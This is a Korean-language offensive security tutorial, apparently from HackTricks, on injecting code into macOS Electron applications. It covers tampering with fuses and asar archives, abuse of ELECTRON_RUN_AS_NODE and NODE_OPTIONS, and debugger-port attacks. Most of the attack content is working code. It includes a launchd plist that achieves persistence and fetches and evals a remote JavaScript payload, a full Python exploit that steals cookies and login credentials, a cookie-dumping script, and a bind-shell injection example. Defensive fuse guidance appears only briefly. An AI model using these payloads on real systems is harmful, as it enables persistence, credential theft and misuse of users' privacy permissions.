# macOS Electron Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## 기본 정보

Electron이 무엇인지 모른다면 [**여기에서 자세한 정보를 확인할 수 있습니다**](https://book.hacktricks.wiki/en/desktop-application-security/electron-desktop-apps/index.html#rce-xss--contextisolation). 지금은 Electron이 **node**를 실행한다는 점만 알아두면 됩니다.\
그리고 node에는 지정된 파일 외의 다른 코드를 **실행하도록 만들 수 있는** 몇 가지 **매개변수**와 **환경 변수**가 있습니다.

크로스 플랫폼 로컬 쓰기 사전 조건과 ASAR/V8 스냅샷 경로는 [Electron 로컬 코드 injection 및 스냅샷 변조](../../../desktop-application-security/electron-desktop-apps/electron-local-code-injection-and-snapshot-tampering.md)를 참조하세요.

### Electron Fuses

이 기법들은 다음에 설명하겠습니다. 하지만 최근 Electron에는 이를 방지하기 위한 여러 **보안 플래그**가 추가되었습니다. 이 플래그가 [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses)이며, macOS의 Electron 앱이 **임의의 코드를 로드하는 것을 방지**하는 데 사용되는 플래그는 다음과 같습니다:<sup>[[1]](#references)</sup>

- **`RunAsNode`**: 비활성화하면 코드 injection에 **`ELECTRON_RUN_AS_NODE`** 환경 변수를 사용할 수 없습니다.
- **`EnableNodeCliInspectArguments`**: 비활성화하면 `--inspect`, `--inspect-brk` 같은 매개변수가 적용되지 않습니다. 이 방식으로 코드를 injection하는 것을 방지합니다.
- **`EnableEmbeddedAsarIntegrityValidation`**: 활성화하면 로드되는 **`asar`** **파일**을 macOS에서 **검증**합니다. 따라서 이 파일의 내용을 수정해 **코드를 injection하는 것을 방지**합니다.
- **`OnlyLoadAppFromAsar`**: 활성화하면 다음 순서로 로드할 파일을 찾는 대신 **`app.asar`**, **`app`**, 마지막으로 **`default_app.asar`**를 찾는 대신 `app.asar`만 확인하고 사용합니다. 따라서 **`embeddedAsarIntegrityValidation`** fuse와 **함께 사용하면** **검증되지 않은 코드를 로드할 수 없습니다**.
- **`LoadBrowserProcessSpecificV8Snapshot`**: 활성화하면 브라우저 프로세스가 V8 스냅샷으로 `browser_v8_context_snapshot.bin` 파일을 사용합니다.

코드 injection을 방지하지는 않지만 흥미로운 fuse는 다음과 같습니다.

- **EnableCookieEncryption**: 활성화하면 디스크의 cookie store가 OS 수준의 암호화 키를 사용해 암호화됩니다.

### Electron Fuses 확인하기

다음 명령으로 애플리케이션에서 **이 플래그를 확인할 수 있습니다**:

```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
  RunAsNode is Disabled
  EnableCookieEncryption is Enabled
  EnableNodeOptionsEnvironmentVariable is Disabled
  EnableNodeCliInspectArguments is Disabled
  EnableEmbeddedAsarIntegrityValidation is Enabled
  OnlyLoadAppFromAsar is Enabled
  LoadBrowserProcessSpecificV8Snapshot is Disabled
```

### Electron Fuses 수정

[**문서에 나와 있듯이**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), **Electron Fuses**의 설정은 **Electron 바이너리**에 저장되며, 바이너리 어딘가에 **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`** 문자열이 포함되어 있습니다.<sup>[[1]](#references)</sup>

macOS 애플리케이션에서는 일반적으로 `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`에 있습니다.

```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```

이 파일을 [https://hexed.it/](https://hexed.it/)에서 열고 이전 문자열을 검색할 수 있습니다. 이 문자열 뒤에 ASCII로 표시된 숫자 "0" 또는 "1"이 있으며, 각 fuse가 비활성화되었는지 활성화되었는지를 나타냅니다. hex 코드를 수정하면(`0x30`은 `0`, `0x31`은 `1`) **fuse 값을 수정**할 수 있습니다.

<figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>

수정된 바이트로 애플리케이션 안의 **`Electron Framework` 바이너리를 덮어쓰면** 앱이 실행되지 않는다는 점에 유의하세요.

## Electron Applications에 코드를 추가해 RCE

Electron App에서 사용하는 **외부 JS/HTML 파일**이 있을 수 있습니다. 공격자는 이 파일들에 코드를 주입할 수 있으며, 파일 서명은 확인되지 않으므로 앱의 컨텍스트에서 임의의 코드를 실행할 수 있습니다.

> [!CAUTION]
> 다만 현재는 다음 두 가지 제한 사항이 있습니다.
>
> - 앱을 수정하려면 **`kTCCServiceSystemPolicyAppBundles`** 권한이 **필요**하므로, 기본적으로는 더 이상 수정할 수 없습니다.
> - 컴파일된 **`asap`** 파일에는 보통 **`embeddedAsarIntegrityValidation`** `and` **`onlyLoadAppFromAsar`** fuse가 **활성화**되어 있습니다.
>
> 이로 인해 이 공격 경로가 더 복잡해지거나 불가능해집니다.

애플리케이션을 다른 디렉터리(예: **`/tmp`**)에 복사하고, **`app.app/Contents`** 폴더 이름을 **`app.app/NotCon`**으로 변경한 다음, **악성** 코드로 **asar** 파일을 **수정**하고, 다시 **`app.app/Contents`**로 이름을 변경한 뒤 실행하면 **`kTCCServiceSystemPolicyAppBundles`** 요구 사항을 우회할 수 있습니다.<sup>[[5]](#references)</sup>

asar 파일에서 코드를 다음과 같이 압축 해제할 수 있습니다:

```bash
npx asar extract app.asar app-decomp
```

수정한 후 다음 명령으로 다시 패키징합니다:

```bash
npx asar pack app-decomp app-new.asar
```

## ELECTRON_RUN_AS_NODE를 통한 RCE

[**문서**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node)에 따르면, 이 환경 변수가 설정되면 프로세스가 일반 Node.js 프로세스로 시작됩니다.<sup>[[6]](#references)</sup>

```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```

> [!CAUTION]
> fuse **`RunAsNode`**가 비활성화되어 있으면 env var **`ELECTRON_RUN_AS_NODE`**는 무시되며, 이 방법은 작동하지 않습니다.

### App Plist에서의 Injection

[**여기에서 제안된 것처럼**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), plist에서 이 env variable을 악용해 persistence를 유지할 수 있습니다:<sup>[[2]](#references)</sup>

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>EnvironmentVariables</key>
    <dict>
           <key>ELECTRON_RUN_AS_NODE</key>
           <string>true</string>
    </dict>
    <key>Label</key>
    <string>com.xpnsec.hideme</string>
    <key>ProgramArguments</key>
    <array>
        <string>/Applications/Slack.app/Contents/MacOS/Slack</string>
        <string>-e</string>
        <string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
```

## `NODE_OPTIONS`를 이용한 RCE

payload를 다른 파일에 저장한 후 실행할 수 있습니다:

```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```

> [!CAUTION]
> fuse **`EnableNodeOptionsEnvironmentVariable`**이 **disabled**이면, 앱을 실행할 때 env var **NODE_OPTIONS**가 무시됩니다. 단, env variable **`ELECTRON_RUN_AS_NODE`**가 설정된 경우는 예외입니다. 이 env variable도 fuse **`RunAsNode`**가 disabled이면 무시됩니다.
>
> **`ELECTRON_RUN_AS_NODE`**를 설정하지 않으면 다음 **error**가 표시됩니다: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`

### App Plist에서 Injection

이 env variable을 plist에서 악용해 다음 키를 추가하면 persistence를 유지할 수 있습니다:

```xml
<dict>
    <key>EnvironmentVariables</key>
    <dict>
           <key>ELECTRON_RUN_AS_NODE</key>
           <string>true</string>
           <key>NODE_OPTIONS</key>
           <string>--require /tmp/payload.js</string>
    </dict>
    <key>Label</key>
    <string>com.hacktricks.hideme</string>
    <key>RunAtLoad</key>
    <true/>
</dict>
```

## inspecting을 통한 RCE

[**이 글**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f)에 따르면, **`--inspect`**, **`--inspect-brk`**, **`--remote-debugging-port`**와 같은 플래그를 사용해 Electron 애플리케이션을 실행하면 **debug 포트가 열리므로**, 해당 포트에 연결할 수 있습니다(예: Chrome의 `chrome://inspect`에서). 또한 **해당 포트에 코드를 주입**하거나 새 프로세스를 실행할 수도 있습니다.<sup>[[7]](#references)</sup>\
예를 들면:

```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```

[**이 블로그 게시물**](https://hackerone.com/reports/1274695)에서는 이 debugging을 악용해 Headless Chrome이 **임의의 위치에 임의의 파일을 다운로드하도록** 합니다.<sup>[[8]](#references)</sup>

> [!TIP]
> 앱에 env variables나 `--inspect` 같은 params가 설정되었는지 확인하는 자체 방식이 있다면, 인수 `--inspect-brk`를 사용해 runtime에서 이를 **우회**할 수 있습니다. 이 인수는 앱 시작 시점에 **실행을 중지**하므로, 우회 작업을 수행할 수 있습니다(예를 들어 현재 프로세스의 args나 env variables를 덮어쓰기).

다음은 앱을 모니터링하면서 `--inspect-brk` param으로 실행해 앱에 설정된 자체 보호 기능을 우회한 exploit입니다. 이 exploit은 프로세스의 params에서 `--inspect-brk`를 제거한 다음, JS payload를 주입해 앱의 cookies와 credentials를 덤프했습니다:

```python
import asyncio
import websockets
import json
import requests
import os
import psutil
from time import sleep

INSPECT_URL = None
CONT = 0
CONTEXT_ID = None
NAME = None
UNIQUE_ID = None

JS_PAYLOADS = """
var { webContents } = require('electron');
var fs = require('fs');

var wc = webContents.getAllWebContents()[0]


function writeToFile(filePath, content) {
    const data = typeof content === 'string' ? content : JSON.stringify(content, null, 2);

    fs.writeFile(filePath, data, (err) => {
        if (err) {
            console.error(`Error writing to file ${filePath}:`, err);
        } else {
            console.log(`File written successfully at ${filePath}`);
        }
    });
}

function get_cookies() {
    intervalIdCookies = setInterval(() => {
        console.log("Checking cookies...");
        wc.session.cookies.get({})
        .then((cookies) => {
            tokenCookie = cookies.find(cookie => cookie.name === "token");
            if (tokenCookie){
                writeToFile("/tmp/cookies.txt", cookies);
                clearInterval(intervalIdCookies);
                wc.executeJavaScript(`alert("Cookies stolen and written to /tmp/cookies.txt")`);
            }
        })
    }, 1000);
}

function get_creds() {
    in_location = false;
    intervalIdCreds = setInterval(() => {
        if (wc.mainFrame.url.includes("https://www.victim.com/account/login")) {
            in_location = true;
            console.log("Injecting creds logger...");
            wc.executeJavaScript(`
                (function() {
                    email = document.getElementById('login_email_id');
                    password = document.getElementById('login_password_id');
                    if (password && email) {
                        return email.value+":"+password.value;
                    }
                })();
            `).then(result => {
                writeToFile("/tmp/victim_credentials.txt", result);
            })
        }
        else if (in_location) {
            wc.executeJavaScript(`alert("Creds stolen and written to /tmp/victim_credentials.txt")`);
            clearInterval(intervalIdCreds);
        }
    }, 10); // Check every 10ms
    setTimeout(() => clearInterval(intervalId), 20000); // Stop after 20 seconds
}

get_cookies();
get_creds();
console.log("Payloads injected");
"""

async def get_debugger_url():
    """
    Fetch the local inspector's WebSocket URL from the JSON endpoint.
    Assumes there's exactly one debug target. 
    """
    global INSPECT_URL

    url = "http://127.0.0.1:9229/json"
    response = requests.get(url)
    data = response.json()
    if not data:
        raise RuntimeError("No debug targets found on port 9229.")
    # data[0] should contain an object with "webSocketDebuggerUrl"
    ws_url = data[0].get("webSocketDebuggerUrl")
    if not ws_url:
        raise RuntimeError("webSocketDebuggerUrl not found in inspector data.")
    INSPECT_URL = ws_url


async def monitor_victim():
    print("Monitoring victim process...")
    found = False
    while not found:
        sleep(1)  # Check every second
        for process in psutil.process_iter(attrs=['pid', 'name']):
            try:
                # Check if the process name contains "victim"
                if process.info['name'] and 'victim' in process.info['name']:
                    found = True
                    print(f"Found victim process (PID: {process.info['pid']}). Terminating...")
                    os.kill(process.info['pid'], 9)  # Force kill the process
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                # Handle processes that might have terminated or are inaccessible
                pass
    os.system("open /Applications/victim.app --args --inspect-brk")

async def bypass_protections():
    global CONTEXT_ID, NAME, UNIQUE_ID
    print(f"Connecting to {INSPECT_URL} ...")

    async with websockets.connect(INSPECT_URL) as ws:
        data = await send_cmd(ws, "Runtime.enable", get_first=True)
        CONTEXT_ID = data["params"]["context"]["id"]
        NAME = data["params"]["context"]["name"]
        UNIQUE_ID = data["params"]["context"]["uniqueId"]
        
        sleep(1)

        await send_cmd(ws, "Debugger.enable", {"maxScriptsCacheSize": 10000000})

        await send_cmd(ws, "Profiler.enable")

        await send_cmd(ws, "Debugger.setBlackboxPatterns", {"patterns": ["/node_modules/|/browser_components/"], "skipAnonnymous": False})

        await send_cmd(ws, "Runtime.runIfWaitingForDebugger")

        await send_cmd(ws, "Runtime.executionContextCreated", get_first=False, params={"context": {"id": CONTEXT_ID, "origin": "", "name": NAME, "uniqueId": UNIQUE_ID, "auxData": {"isDefault": True}}})

        code_to_inject = """process['argv'] = ['/Applications/victim.app/Contents/MacOS/victim']"""
        await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression": code_to_inject, "uniqueContextId":UNIQUE_ID})
        print("Injected code to bypass protections")


async def js_payloads():
    global CONT, CONTEXT_ID, NAME, UNIQUE_ID

    print(f"Connecting to {INSPECT_URL} ...")

    async with websockets.connect(INSPECT_URL) as ws:
        data = await send_cmd(ws, "Runtime.enable", get_first=True)
        CONTEXT_ID = data["params"]["context"]["id"]
        NAME = data["params"]["context"]["name"]
        UNIQUE_ID = data["params"]["context"]["uniqueId"]
        await send_cmd(ws, "Runtime.compileScript", get_first=False, params={"expression":JS_PAYLOADS,"sourceURL":"","persistScript":False,"executionContextId":1})
        await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression":JS_PAYLOADS,"objectGroup":"console","includeCommandLineAPI":True,"silent":False,"returnByValue":False,"generatePreview":True,"userGesture":False,"awaitPromise":False,"replMode":True,"allowUnsafeEvalBlockedByCSP":True,"uniqueContextId":UNIQUE_ID})



async def main():
    await monitor_victim()
    sleep(3)
    await get_debugger_url()
    await bypass_protections()

    sleep(7)

    await js_payloads()
    


async def send_cmd(ws, method, get_first=False, params={}):
    """
    Send a command to the inspector and read until we get a response with matching "id".
    """
    global CONT

    CONT += 1

    # Send the command
    await ws.send(json.dumps({"id": CONT, "method": method, "params": params}))
    sleep(0.4)

    # Read messages until we get our command result
    while True:
        response = await ws.recv()
        data = json.loads(response)

        # Print for debugging
        print(f"[{method} / {CONT}] ->", data)

        if get_first:
            return data

        # If this message is a response to our command (by matching "id"), break
        if data.get("id") == CONT:
            return data

        # Otherwise it's an event or unrelated message; keep reading

if __name__ == "__main__":
    asyncio.run(main())
```

> [!CAUTION]
> **`EnableNodeCliInspectArguments`** fuse가 비활성화되어 있으면, env variable **`ELECTRON_RUN_AS_NODE`**이 설정되지 않은 경우 앱은 실행 시 **`--inspect`** 같은 node parameters를 **무시합니다**. 이 env variable도 **`RunAsNode`** fuse가 비활성화되어 있으면 **무시됩니다**.
>
> 하지만 **electron param `--remote-debugging-port=9229`**는 계속 사용할 수 있지만, 이전 payload로는 다른 프로세스를 실행할 수 없습니다.

**`--remote-debugging-port=9222`** param을 사용하면 Electron App에서 **history**(GET commands 사용)나 브라우저의 **cookies**(브라우저 내부에서 **decrypted**되고 이를 제공하는 **json endpoint**가 있음) 같은 정보를 탈취할 수 있습니다.

[**여기**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)와 [**여기**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)에서 방법을 알아보고, 자동화 도구 [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut)이나 다음과 같은 간단한 스크립트를 사용할 수 있습니다:<sup>[[9]](#references)[[10]](#references)</sup>

```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```



### App Plist에서 Injection

plist에서 이 env variable을 악용해 다음 키를 추가하면 persistence를 유지할 수 있습니다:

```xml
<dict>
    <key>ProgramArguments</key>
    <array>
        <string>/Applications/Slack.app/Contents/MacOS/Slack</string>
        <string>--inspect</string>
    </array>
    <key>Label</key>
    <string>com.hacktricks.hideme</string>
    <key>RunAtLoad</key>
    <true/>
</dict>
```

## TCC Bypass: 구버전 악용

> [!TIP]
> macOS의 TCC daemon은 애플리케이션의 실행 버전을 확인하지 않습니다. 따라서 이전 기법으로 **Electron 애플리케이션에 코드를 주입할 수 없다면**, 이전 버전의 APP을 다운로드해 여기에 코드를 주입할 수 있습니다. TCC 권한은 계속 유지되기 때문입니다(Trust Cache가 이를 막는 경우는 제외).

## JS가 아닌 코드 실행

앞선 기법을 사용하면 **Electron 애플리케이션의 프로세스 안에서 JS 코드를 실행**할 수 있습니다. 하지만 **자식 프로세스는 부모 애플리케이션과 동일한 sandbox profile로 실행되며 TCC 권한을 상속**한다는 점을 기억하세요.\
따라서 예를 들어 카메라나 마이크에 접근하기 위해 entitlements를 악용하려면, **해당 프로세스에서 다른 바이너리를 실행**하기만 하면 됩니다.

## 주목할 만한 Electron macOS 취약점 (2023-2024)

### CVE-2023-44402 – ASAR 무결성 우회

Electron ≤22.3.23 및 여러 23-27 사전 릴리스에서는 `.app/Contents/Resources` 폴더에 쓰기 권한이 있는 공격자가 `embeddedAsarIntegrityValidation` **및** `onlyLoadAppFromAsar` fuses를 우회할 수 있었습니다. 무결성 검사기의 *파일 유형 혼동* 버그로 인해 검증된 아카이브 대신 **`app.asar`라는 이름의 디렉터리**를 불러올 수 있었고, 따라서 해당 디렉터리 안에 넣은 JavaScript가 앱 시작 시 실행되었습니다. 그러므로 보안 강화 지침에 따라 두 fuse를 모두 활성화한 공급업체의 앱도 macOS에서 여전히 취약했습니다.<sup>[[3]](#references)</sup>

패치된 Electron 버전: **22.3.24**, **24.8.3**, **25.8.1**, **26.2.1**, **27.0.0-alpha.7**. 구버전 빌드를 실행 중인 애플리케이션을 발견한 공격자는 `Contents/Resources/app.asar`를 자신의 디렉터리로 덮어써서 애플리케이션의 TCC entitlements로 코드를 실행할 수 있습니다.<sup>[[3]](#references)</sup> 

### 2024년 “RunAsNode” / “enableNodeCliInspectArguments” CVE 묶음

2024년 1월, 일련의 CVE(CVE-2024-23738~CVE-2024-23743)는 많은 Electron 앱에서 **RunAsNode** 및 **EnableNodeCliInspectArguments** fuses가 여전히 활성화된 상태로 배포된다는 점을 드러냈습니다. 따라서 로컬 공격자는 환경 변수 `ELECTRON_RUN_AS_NODE=1` 또는 `--inspect-brk` 같은 플래그를 사용해 프로그램을 다시 실행하고, 이를 *범용* Node.js 프로세스로 바꿔 애플리케이션의 sandbox 및 TCC 권한을 모두 상속할 수 있습니다.<sup>[[4]](#references)</sup>

Electron 팀은 “critical” 등급에 이의를 제기하며 공격자에게 이미 로컬 코드 실행 권한이 필요하다고 지적했지만, 이 문제는 post-exploitation 과정에서 여전히 유용합니다. 취약한 Electron 번들을 *living-off-the-land* 바이너리로 바꿔, 데스크톱 앱에 이전에 허용된 Contacts, Photos 또는 기타 민감한 리소스를 읽는 등의 작업을 수행할 수 있기 때문입니다.<sup>[[4]](#references)</sup>

Electron 유지관리자의 방어 지침:<sup>[[4]](#references)</sup>

* 프로덕션 빌드에서 `RunAsNode` 및 `EnableNodeCliInspectArguments` fuses를 비활성화합니다.
* 애플리케이션에서 보조 Node.js 프로세스가 필요한 경우, 해당 fuses를 다시 활성화하는 대신 최신 **UtilityProcess** API를 사용합니다. 

## 자동 주입

- [**electroniz3r**](https://github.com/r3ggi/electroniz3r)

[**electroniz3r**](https://github.com/r3ggi/electroniz3r) 도구를 사용하면 설치된 **취약한 electron 애플리케이션을 찾아** 코드를 주입할 수 있습니다. 이 도구는 **`--inspect`** 기법을 시도합니다:<sup>[[5]](#references)</sup>

직접 컴파일해야 하며, 다음과 같이 사용할 수 있습니다:

```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```

- [https://github.com/boku7/Loki](https://github.com/boku7/Loki)

Loki는 애플리케이션의 JavaScript 파일을 Loki Command & Control JavaScript 파일로 교체하여 Electron 애플리케이션에 백도어를 설치하도록 설계되었습니다.

## References

- [1] [Electron 퓨즈](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [2] [서드파티 프레임워크를 통한 macOS 인젝션 - TrustedSec](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
- [3] [파일 유형 혼동을 통한 ASAR 무결성 우회 (GHSA-7m48-wc93-9g85)](https://github.com/electron/electron/security/advisories/GHSA-7m48-wc93-9g85)
- [4] [‘runAsNode’ CVE 관련 입장 - Electron](https://www.electronjs.org/blog/statement-run-as-node-cves)
- [5] [DEF CON 31 - macOS 프라이버시의 ELECTRON화 - Red Team 무기고의 새로운 무기 - Wojciech Reguła](https://m.youtube.com/watch?v=VWQY5R2A6X8)
- [6] [환경 변수 | Electron](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node)
- [7] [Electron 앱이 비밀 정보를 기밀로 저장할 수 없는 이유: --inspect 옵션](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f)
- [8] [HackerOne 보고서 #1274695 - Electron 디버깅 악용으로 임의 파일 다운로드](https://hackerone.com/reports/1274695)
- [9] [쿠키 단지에 손 넣기: Chromium의 원격 디버거 포트를 사용한 쿠키 덤프 - SpecterOps](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)
- [10] [Chromium 원격 디버거를 사용한 쿠키 덤프 실패 디버깅 - slyd0g](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)
{{#include ../../../banners/hacktricks-training.md}}
